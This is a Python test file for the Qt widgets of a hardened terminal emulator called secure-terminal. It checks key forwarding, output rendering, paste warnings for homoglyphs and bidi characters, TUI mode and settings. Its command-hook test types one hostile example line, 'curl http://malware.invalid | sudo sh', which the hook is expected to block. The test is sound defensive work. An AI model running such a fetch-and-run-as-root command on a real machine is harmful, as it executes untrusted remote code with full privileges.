#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""
Offscreen widget/window tests for secure-terminal: the behaviour that lives in
the Qt layer (terminal.py / main.py / dialog.py) rather than the pure core.
Needs PyQt6 (offscreen) and python3-pyte. These are declared dependencies of the
test (the CI container installs them), so a missing one is a hard FAILURE, not a
skip -- a security-relevant test must never be silently disabled. Exit 0 on full
pass, 1 on any failure or missing dependency.
"""

import os
import sys
import signal
import tempfile

os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
os.environ['XDG_CONFIG_HOME'] = tempfile.mkdtemp(prefix='st-widget-cfg-')
# Isolate session state too, or a real leftover session on the box would be
# restored and make the window's initial mode/tabs nondeterministic.
os.environ['XDG_STATE_HOME'] = tempfile.mkdtemp(prefix='st-widget-state-')
try:
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
except (OSError, ValueError, AttributeError):
    pass

try:
    from PyQt6.QtWidgets import QApplication, QInputDialog
    from PyQt6.QtGui import QKeyEvent, QColor
    from PyQt6.QtCore import QEvent, Qt, QTimer, QEventLoop, QMimeData
    from secure_terminal.terminal import SecureTerminal, tui_available
    from secure_terminal import dialog as st_dialog
except Exception as exc:  # pylint: disable=broad-except
    # Fail closed: a missing test dependency (PyQt6, pyte, the module) must not
    # be silently skipped.
    sys.stderr.write('secure-terminal-tests(widget): FAIL missing dependency: '
                     '%s\n' % exc)
    sys.exit(1)

APP = QApplication.instance() or QApplication([])
PASS = 0
FAIL = 0


def ok(cond, msg):
    global PASS, FAIL
    if cond:
        PASS += 1
    else:
        FAIL += 1
        sys.stderr.write('FAIL: ' + msg + '\n')


def eq(got, want, msg):
    ok(got == want, '%s -> %r, want %r' % (msg, got, want))


def pump(ms):
    loop = QEventLoop()
    QTimer.singleShot(ms, loop.quit)
    loop.exec()


def key(term, qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    term.keyPressEvent(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


def spy_writes(term):
    sent = []
    term._write = sent.append          # pylint: disable=protected-access
    return sent


# --- line-mode key forwarding -------------------------------------------------
t = SecureTerminal(command='/bin/cat')
sent = spy_writes(t)
key(t, Qt.Key.Key_A, 'a')
key(t, Qt.Key.Key_Return)
key(t, Qt.Key.Key_Backspace)
key(t, Qt.Key.Key_Tab)
eq(sent, [b'a', b'\r', b'\x7f', b'\t'], 'line keys forwarded')
sent.clear()
key(t, Qt.Key.Key_D, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+D EOF
key(t, Qt.Key.Key_L, '', Qt.KeyboardModifier.ControlModifier)   # Ctrl+L clear
eq(sent, [b'\x04', b'\x0c'], 'ctrl D/L are bytes')
sent.clear()
# Ctrl+<letter> sends its control byte, like a real terminal: cooked mode turns
# 0x03 into SIGINT, a raw-mode app reads the byte itself (readline Ctrl+A/R, an
# app's own "press Ctrl+C again to exit"). Ctrl+backslash -> 0x1c (SIGQUIT).
key(t, Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_A, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_R, '', Qt.KeyboardModifier.ControlModifier)
key(t, Qt.Key.Key_Backslash, '', Qt.KeyboardModifier.ControlModifier)
eq(sent, [b'\x03', b'\x01', b'\x12', b'\x1c'], 'ctrl+key sends its control byte')
# printable non-ASCII is a deliberate keystroke -> sent UTF-8 (euro, e-acute)
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x20AC))       # euro sign
key(t, Qt.Key.Key_unknown, chr(0x00E9))       # e-acute
eq(sent, [chr(0x20AC).encode('utf-8'), chr(0x00E9).encode('utf-8')],
   'printable unicode input sent as utf-8')
# a non-printable keystroke (bidi override) is still dropped
sent.clear()
key(t, Qt.Key.Key_unknown, chr(0x202E))       # RLO bidi override
eq(sent, [], 'non-printable (bidi) input dropped')

# --- _append: backspace erase, CRLF, overwrite, line-local --------------------
a = SecureTerminal(command='/bin/cat')
a._append('abc')
a._append('\x08 \x08')                 # readline erase
eq(a.toPlainText().rstrip(), 'ab', 'backspace erase')
b = SecureTerminal(command='/bin/cat')
b._append('l1\r\nl2\r\n')
eq(b.toPlainText(), 'l1\nl2\n', 'CRLF collapsed')
c = SecureTerminal(command='/bin/cat')
c._append('123456')
c._append('\rAB')
eq(c.toPlainText(), 'AB3456', 'bare CR overwrite')
d = SecureTerminal(command='/bin/cat')
d._append('first\nsecond')
d._append('\rX')
eq(d.toPlainText(), 'first\nXecond', 'CR line-local')
# multi-backspace: five readline erases delete five chars (persistent cursor)
mb = SecureTerminal(command='/bin/cat')
mb._append('fffff')
for _ in range(5):
    mb._append('\x08 \x08')
eq(mb.toPlainText().rstrip(), '', 'five backspaces erase five chars')
# a write lands where a program left the cursor mid-line (zsh prompt + fill),
# not at end-of-document -- the wall-of-spaces-before-input bug
pc = SecureTerminal(command='/bin/cat')
pc._append('P% ')            # prompt
pc._append(' ' * 8)           # trailing fill beyond the cursor
pc._append('\r')              # carriage return -> column 0
pc._append('P% ')             # redraw the prompt over the fill
pc._append('x')               # the echo must land right after the prompt
ok(pc.toPlainText().startswith('P% x'), 'write lands at the persistent cursor')
# a plain click must not strand the blinking caret where you cannot type: input
# always goes to the shell at the output cursor, so mouseReleaseEvent snaps the
# caret back unless a drag made a selection (which is kept, for copy).
from PyQt6.QtGui import QMouseEvent, QTextCursor      # noqa: E402
from PyQt6.QtCore import QPointF                       # noqa: E402
cs = SecureTerminal(command='/bin/cat')
cs._append('prompt> ')
_out = cs._out_cursor.position()
_stray = QTextCursor(cs.document())
_stray.setPosition(2)                                  # as if a click landed here
cs.setTextCursor(_stray)
_release = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(1, 1), QPointF(1, 1),
                       Qt.MouseButton.LeftButton, Qt.MouseButton.NoButton,
                       Qt.KeyboardModifier.NoModifier)
cs.mouseReleaseEvent(_release)
eq(cs.textCursor().position(), _out, 'plain click snaps the caret back to output')
# a selection (drag) survives the release, so copy still works
_sel = QTextCursor(cs.document())
_sel.setPosition(0)
_sel.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
cs.setTextCursor(_sel)
cs.mouseReleaseEvent(_release)
ok(cs.textCursor().hasSelection(), 'a drag selection survives the release')
# scrollback navigation in line mode: PageUp scrolls the buffer up, Shift+Home/
# End jump to the ends, plain Home is left for line editing (does not scroll)
sc = SecureTerminal(command='/bin/cat')
sc.resize(600, 200)
sc.show()
for _i in range(200):
    sc._append('line %d\n' % _i)
_bar = sc.verticalScrollBar()
_bottom = _bar.value()
key(sc, Qt.Key.Key_PageUp)
ok(_bar.value() < _bottom, 'PageUp scrolls the scrollback up')
key(sc, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.maximum(), 'Shift+End jumps to the bottom')
key(sc, Qt.Key.Key_Home, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.minimum(), 'Shift+Home jumps to the top')
_bar.setValue(50)
key(sc, Qt.Key.Key_Home)
eq(_bar.value(), 50, 'plain Home does not scroll (reserved for editing)')
# flood must not hang: a large control-laden blob (every byte 0x00-0xff, so it
# carries CR/BS/NL) renders in bounded time and bounded document size. This is
# the "cat /dev/random freeze" regression -- the old per-char cursor path took
# minutes; the bulk path is seconds.
import time as _time                                  # noqa: E402
from secure_terminal import sanitize as _S            # noqa: E402
fl = SecureTerminal(command='/bin/cat')
fl.resize(600, 300)
_blob = _S.render_output((bytes(range(256)) * 8000).decode('latin-1'), 'strip')
_t0 = _time.time()
for _ in range(2):                                    # ~4MB of control-laden output
    fl._append(_blob)
_elapsed = _time.time() - _t0
ok(_elapsed < 30, 'control-laden flood renders in bounded time (%.1fs)' % _elapsed)
ok(fl.document().blockCount() <= 10000,
   'flood document stays bounded (%d blocks)' % fl.document().blockCount())
# keyboard tab navigation: the widget emits tab_step / tab_move so the window can
# switch or reorder tabs (Ctrl+PageUp/Down and the Shift variants)
nav = SecureTerminal(command='/bin/cat')
_steps, _moves = [], []
nav.tab_step.connect(_steps.append)
nav.tab_move.connect(_moves.append)
key(nav, Qt.Key.Key_PageDown, mods=Qt.KeyboardModifier.ControlModifier)
key(nav, Qt.Key.Key_PageUp,
    mods=Qt.KeyboardModifier.ControlModifier | Qt.KeyboardModifier.ShiftModifier)
eq((_steps, _moves), ([1], [-1]),
   'Ctrl+PageDown steps tab, Ctrl+Shift+PageUp moves tab')
# a display-mode toggle re-renders the WHOLE existing buffer, not only new output
rr = SecureTerminal(command='/bin/cat')
_rr_raw = 'cafe' + chr(0x00E9) + '\n'
rr._raw = _rr_raw
rr._append(_S.render_output(_rr_raw, 'strip'))
eq(rr.toPlainText().rstrip(), 'cafe_', 'strip shows non-ascii as _')
rr.apply_mode('reveal')
eq(rr.toPlainText().rstrip(), 'cafe<U+00E9>', 'reveal re-renders existing scrollback')
rr.apply_mode('show')
eq(rr.toPlainText().rstrip(), 'cafe' + chr(0x00E9), 'show re-renders existing scrollback')
rr.apply_mode('strip')
eq(rr.toPlainText().rstrip(), 'cafe_', 'strip re-renders the scrollback back')
# a mode toggle after a flood re-renders only the recent tail, not the full
# scrollback: reveal expands each byte to an 8-char <U+XXXX>, so re-rendering 1MB
# of raw would be ~8MB and freeze the UI. Bounded, the document stays small.
rf = SecureTerminal(command='/bin/cat')
rf._raw = (b''.join(bytes([i % 256]) for i in range(1000)) * 1000).decode('latin-1')
rf.apply_mode('reveal')
ok(len(rf.toPlainText()) < 1_200_000,
   'mode toggle re-renders only the bounded tail, not the whole 8MB expansion')
# command hook: judge the typed line before Enter submits it. The terminal here
# runs /bin/cat, which only echoes -- no typed string is ever executed.
hk = SecureTerminal(command='/bin/cat')
_handler = [sys.executable, '-c',
            'import sys, json\n'
            'c = json.load(sys.stdin)["command"]\n'
            'print(json.dumps({"verdict": "block", "message": "no",'
            ' "suggestion": "ls"} if "sudo sh" in c else {"verdict": "allow"}))']
hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
               'transcript': 'none'})
_hsent = spy_writes(hk)
_hnotes = []
hk.hook_notice.connect(_hnotes.append)


def _htype(term, text):
    for _ch in text:
        key(term, Qt.Key.Key_A, _ch)


_htype(hk, 'ls')
key(hk, Qt.Key.Key_Return)
ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
_hsent.clear()
hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
_htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
key(hk, Qt.Key.Key_Return)
ok(b'\r' not in _hsent and b'\x15' in _hsent,
   'hook blocks: not submitted, typed line discarded (Ctrl+U)')
ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')

# --- colours: SGR run formatting + contrast guard -----------------------------
col = SecureTerminal(command='/bin/cat')
col.apply_colors(True)
col.apply_theme('dark')
runs = col._render_runs('\x1b[31mR\x1b[0m')
red = [f for text, f in runs if text == 'R'][0]
eq(red.foreground().color().name(), '#cd0000', 'red run fg')
hid = [f for text, f in col._render_runs('\x1b[30mH\x1b[0m') if text == 'H'][0]
ok(hid.foreground().color().name() != '#000000', 'black-on-dark guarded')

# --- paste gating -------------------------------------------------------------
p = SecureTerminal(command='/bin/cat')
psent = spy_writes(p)
mime = QMimeData()
mime.setText('echo hi\n')
p.insertFromMimeData(mime)
eq(psent, [b'echo hi\r'], 'clean paste sent directly')
psent.clear()
# a paste with a homoglyph (Cyrillic a) plus a bidi override: three choices
mime2 = QMimeData()
mime2.setText('pay' + chr(0x0430) + 'l' + chr(0x202E) + '\n')
st_dialog.PasteWarningDialog.confirm = staticmethod(lambda *a, **k: 'reject')
p.insertFromMimeData(mime2)
eq(psent, [], 'rejected paste sends nothing')
st_dialog.PasteWarningDialog.confirm = staticmethod(lambda *a, **k: 'stripped')
p.insertFromMimeData(mime2)
eq(psent, [b'payl\r'], 'stripped paste sends ASCII only (homoglyph + bidi dropped)')
psent.clear()
st_dialog.PasteWarningDialog.confirm = staticmethod(lambda *a, **k: 'unicode')
p.insertFromMimeData(mime2)
eq(psent, [('pay' + chr(0x0430) + 'l\r').encode('utf-8')],
   'unicode paste keeps the printable homoglyph but still drops the bidi override')

# --- TUI mode (pyte is a required dependency: fail closed, do not skip) -------
ok(tui_available(), 'python3-pyte available for TUI mode')
if tui_available():
    tui = SecureTerminal(command='/bin/cat', tui=True)
    tui.resize(700, 300)
    tui.show()
    pump(50)
    ok(tui.tui_active(), 'tui active')
    # cursor addressing: place text at row 3 col 5 (1-indexed)
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[2J\x1b[3;5HPLACED')
    tui._render_tui()
    rows = tui.toPlainText().split('\n')
    hit = [(i, r.index('PLACED')) for i, r in enumerate(rows) if 'PLACED' in r]
    eq(hit[:1], [(2, 4)], 'tui cursor addressing')
    # full-screen program layout (what vim/htop/tmux emit): a box drawn with
    # box-drawing characters, cursor-addressed content, and a bottom status line.
    # In show mode the box-drawing glyphs survive; the grid places every piece.
    fs = SecureTerminal(command='/bin/cat', tui=True)
    fs.resize(700, 300)
    fs.show()
    pump(50)
    fs.apply_mode('show')
    _last = fs._screen.lines                   # actual grid height in rows
    _tl, _tr = chr(0x250C), chr(0x2510)        # box corners (vim/tmux borders)
    _h, _v = chr(0x2500), chr(0x2502)
    fs._stream.feed(('\x1b[2J\x1b[1;1H' + _tl + _h * 6 + _tr
                     + '\x1b[2;1H' + _v + ' vim  ' + _v
                     + ('\x1b[%d;1H' % _last) + '-- INSERT --').encode('utf-8'))
    fs._render_tui()
    _fr = fs.toPlainText().split('\n')
    ok(_fr[0].startswith(_tl + _h * 6 + _tr), 'tui draws the top box border')
    ok(_v + ' vim  ' + _v in _fr[1], 'tui places boxed content on row 2')
    ok(_fr[_last - 1].startswith('-- INSERT --'),
       'tui places the status line on the last row')
    # the same frame in strip mode: box-drawing glyphs become _, ASCII stays
    fs.apply_mode('strip')
    fs._render_tui()
    _sr = fs.toPlainText().split('\n')
    ok(_tl not in _sr[0] and '_' in _sr[0], 'strip mode neutralizes box glyphs')
    ok(_sr[_last - 1].startswith('-- INSERT --'), 'strip keeps the ASCII status line')
    fs.shutdown()
    # a pyte parser error on real program output (private SGR that some pyte
    # builds mishandle -- htop/vim/tmux emit these) must be contained, never
    # crash the terminal
    crash = SecureTerminal(command='/bin/cat', tui=True)
    crash.resize(700, 300)
    crash.show()
    pump(50)
    crash._feed_stream(b'\x1b[1;2;3?m')          # private SGR: pyte may raise
    crash._feed_stream(b'ok\r\n')
    crash._render_tui()
    ok('ok' in crash.toPlainText(), 'pyte parser error contained; terminal survives')
    crash.shutdown()
    # per-cell bidi neutralized in strip mode
    tui.apply_mode('strip')
    tui._stream.feed(b'\x1b[10;1Ha\xe2\x80\xaeb')     # a U+202E b
    tui._render_tui()
    ok(chr(0x202E) not in tui.toPlainText(), 'tui bidi neutralized')
    # colour cell renders
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[12;1H\x1b[32mG\x1b[0m')
    tui._render_tui()
    ok(any(row[x].data == 'G' and row[x].fg == 'green'
           for row in [tui._screen.buffer[y] for y in range(tui._screen.lines)]
           for x in range(tui._screen.columns)), 'tui colour cell')
    # title + notification handling when allowed
    tui.apply_allow_title(True)
    titles = []
    notes = []
    tui.title_changed.connect(titles.append)
    tui.notified.connect(notes.append)
    tui._stream.feed(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    tui._handle_title_and_notify(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    ok(titles and chr(0x202E) not in titles[-1], 'tui title sanitized')
    tui._handle_title_and_notify(b'\x1b]9;done\x07')
    ok(notes and notes[-1] == 'done', 'tui notification captured')
    # off: no title emitted
    tui.apply_allow_title(False)
    before = len(titles)
    tui._stream.feed(b'\x1b]2;ignored\x07')
    tui._handle_title_and_notify(b'\x1b]2;ignored\x07')  # guard is in _on_readable
    tui.shutdown()
    # mode switch is renderer-only: NO shell restart, the running program and its
    # frame survive. A program writes a full-screen frame to stdout in line mode;
    # flipping to TUI must show the frame without the pid changing. (The frame
    # goes to stdout, not through the line-discipline echo, so the raw escapes
    # reach the read path.)
    if tui_available():
        # a real program that writes a full-screen frame to stdout, then idles so
        # the child stays alive for the pid check (a temp script avoids the shell
        # quoting/escaping that a -c string would suffer through shlex).
        _script = os.path.join(tempfile.mkdtemp(prefix='st-frame-'), 'frame.sh')
        with open(_script, 'w') as _f:
            _f.write('#!/bin/sh\n'
                     'printf "HIST_LINE\\n"\n'
                     'printf "\\033[?1049h\\033[2J\\033[HFRAME_XYZ\\n"\n'
                     'sleep 30\n')
        os.chmod(_script, 0o755)
        sw = SecureTerminal(command=_script)
        sw.resize(700, 300)
        sw.show()
        pump(300)
        _pid = sw._pid
        ok(sw._alt_screen, 'alt-screen tracked in line mode')
        ok(sw._tui_hint_shown and '[secure-terminal]' in sw.toPlainText(),
           'advisory shown once when a full-screen app runs in line mode')
        sw.apply_tui(True)
        pump(50)
        eq(sw._pid, _pid, 'mode switch does NOT restart the shell (same pid)')
        ok('FRAME_XYZ' in sw.toPlainText(), 'running frame survives the switch to TUI')
        sw.apply_tui(False)
        pump(30)
        eq(sw._pid, _pid, 'switching back does not restart either')
        ok('HIST_LINE' in sw.toPlainText(), 'line scrollback restored on the way back')
        sw.shutdown()
else:
    # already recorded as a FAIL above; do not silently pass
    sys.stderr.write('secure-terminal-tests(widget): FAIL pyte absent, TUI-mode '
                     'assertions could not run\n')

# line mode forwards the cursor/history keys to the shell's line editor: Up/Down
# recall history, Left/Right/Home/End/Delete edit -- the arrow-up regression.
ak = SecureTerminal(command='/bin/cat')
asent = spy_writes(ak)
key(ak, Qt.Key.Key_Up)
key(ak, Qt.Key.Key_Down)
key(ak, Qt.Key.Key_Left)
key(ak, Qt.Key.Key_Right)
key(ak, Qt.Key.Key_Home)
key(ak, Qt.Key.Key_End)
key(ak, Qt.Key.Key_Delete)
eq(asent, [b'\x1b[A', b'\x1b[B', b'\x1b[D', b'\x1b[C', b'\x1b[H', b'\x1b[F', b'\x1b[3~'],
   'line mode forwards arrows/Home/End/Delete to the shell')

# --- window: rename, colour, settings round-trip ------------------------------
from secure_terminal.main import (                   # noqa: E402
    MainWindow, _is_font_noise, _read_version, APP_VERSION,
)
from secure_terminal import settings                 # noqa: E402

# version: baked from debian/changelog at build, read at runtime, fail open
eq(_read_version(['/no/such/version']), 'unknown', 'missing version file -> unknown')
_vf = tempfile.mktemp(prefix='st-version-')
with open(_vf, 'w', encoding='utf-8') as _vh:
    _vh.write('1.2.3-4\n')
eq(_read_version([_vf]), '1.2.3-4', 'version file is read and stripped')
os.remove(_vf)
ok(isinstance(APP_VERSION, str) and APP_VERSION, 'APP_VERSION is a non-empty string')

# font-shaping warning filter: the qt.text.font.db flood is dropped, real
# messages pass through
ok(_is_font_noise('qt.text.font.db', 'OpenType support missing for "X", script 9'),
   'font-db warning is noise')
ok(_is_font_noise('', 'OpenType support missing for "Y"'), 'OpenType line is noise')
ok(not _is_font_noise('default', 'some real warning'), 'real message is not noise')

win = MainWindow()
win.new_tab()
QInputDialog.getText = staticmethod(lambda *a, **k: ('build', True))
win.rename_tab(0)
eq(win.tabs.tabText(0), 'build', 'tab rename')
win.set_tab_color(0, QColor('#d83933'))
ok(not win.tabs.tabIcon(0).isNull(), 'tab colour set')
win.set_tab_color(0, None)
ok(win.tabs.tabIcon(0).isNull(), 'tab colour cleared')
# window tab actions: previous-tab wraps around, goto jumps by position, select
# all selects the current buffer, full screen toggles
win.new_tab()
win.new_tab()
_cnt = win.tabs.count()
win.tabs.setCurrentIndex(0)
win._on_tab_step(-1)
eq(win.tabs.currentIndex(), _cnt - 1, 'previous-tab wraps to the last tab')
win._goto_tab(0)
eq(win.tabs.currentIndex(), 0, 'goto tab 1 by position')
win.current()._append('pick me')
win.select_all()
ok(bool(win.current().textCursor().selectedText()), 'select all selects the buffer')
win.toggle_fullscreen(True)
ok(win.isFullScreen(), 'full screen on')
win.toggle_fullscreen(False)
# unicode display is three mutually-exclusive buttons (Strip/Reveal/Show),
# default strip, colour-coded by safety
win.act_strip.trigger()
ok(win.act_strip.isChecked() and win.current().current_mode() == 'strip',
   'Strip button selects strip')
win.act_show.trigger()
_checked = sum(a.isChecked() for a in (win.act_strip, win.act_reveal, win.act_show))
eq((win.current().current_mode(), _checked), ('show', 1),
   'Show button selects show, exclusively (only one checked)')
win.act_reveal.trigger()
eq(win.current().current_mode(), 'reveal', 'Reveal button selects reveal')
ok(not win.act_strip.icon().isNull() and not win.act_show.icon().isNull(),
   'mode buttons carry icons')
# security indicator: two lamps. display axis (show=red, reveal=green [safe and
# lossless], strip=yellow [safe but lossy -- the "_" is easy to miss]) and mode
# axis (TUI=yellow, line=green).
win.set_mode('strip')
eq((win._display_level()[1], win._display_level()[0]), ('Strip', '#e5a50a'),
   'strip display -> yellow (safe but lossy)')
win.set_mode('reveal')
eq((win._display_level()[1], win._display_level()[0]), ('Reveal', '#1f8a54'),
   'reveal display -> green (safe and lossless, not red)')
win.set_mode('show')
eq((win._display_level()[1], win._display_level()[0]), ('Show', '#d83933'),
   'show display -> red')
eq(win._mode_level()[1], 'Line', 'line mode -> green mode lamp')
if tui_available():
    win.set_tui(True)
    eq((win._mode_level()[1], win._mode_level()[0]), ('TUI', '#e5a50a'),
       'TUI -> yellow mode lamp (independent of the display lamp)')
    win.set_tui(False)
win.set_mode('strip')
ok(not win.sec_display.icon().isNull() and not win.sec_mode.icon().isNull(),
   'both security lamps show an icon')
# About dialog builds without error (patch exec so the modal does not block)
from PyQt6.QtWidgets import QDialog as _QDialog          # noqa: E402
_orig_exec = _QDialog.exec
_QDialog.exec = lambda _self: 0
try:
    win.show_about()
    win._show_security_details()
    ok(True, 'About + security-detail dialogs build without error')
finally:
    _QDialog.exec = _orig_exec
# global settings apply to every open tab and update the defaults
win.new_tab()
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal',
                   'colors': True, 'tui': False, 'allow_title': True,
                   'scrollback': 1000, 'paste_delay': 5, 'persist': True})
ok(all((win.tabs.widget(i).current_theme(), win.tabs.widget(i).current_mode(),
        win.tabs.widget(i).current_scrollback()) == ('light', 'reveal', 1000)
       for i in range(win.tabs.count())),
   'global settings applied to every open tab')
eq(win._default_mode, 'reveal', 'global settings updated the default mode')
# slash-command palette: applies settings, leading slash optional, invalid -> False
ok(win.run_command('/theme light') and win.current().current_theme() == 'light',
   'command /theme light')
ok(win.run_command('mode reveal') and win.current().current_mode() == 'reveal',
   'command mode reveal (no leading slash)')
ok(win.run_command('/colors on') and win.current().colors_enabled(),
   'command /colors on')
ok(win.run_command('/zoom 150') and win.current().current_zoom() == 150,
   'command /zoom 150')
ok(not win.run_command('/bogus xyz'), 'unknown command returns False')
win.set_theme('light')
win.set_zoom(140)
win.set_mode('reveal')
win.close()
cfg = settings.load()
eq(cfg.get('theme'), 'light', 'setting persisted theme')
eq(cfg.get('zoom'), '140', 'setting persisted zoom')
eq(cfg.get('unicode_mode'), 'reveal', 'setting persisted mode')

# --- result -------------------------------------------------------------------
sys.stdout.write('secure-terminal-tests(widget): %d passed, %d failed\n'
                 % (PASS, FAIL))
sys.exit(0 if FAIL == 0 else 1)
